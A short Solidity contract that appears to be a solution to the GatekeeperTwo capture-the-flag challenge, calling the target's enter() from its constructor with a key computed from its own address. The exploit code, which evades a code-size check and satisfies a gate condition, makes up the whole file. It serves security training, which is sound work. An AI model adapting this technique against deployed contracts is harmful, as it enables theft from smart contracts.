// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}
contract Solver {
    IGatekeeperTwo target = IGatekeeperTwo(0xe6E7c083062d95EFD5e0e9BcfAC905e5305D3c46);

    constructor() {
        target.enter(~bytes8(keccak256(abi.encodePacked(this))));
    }
}
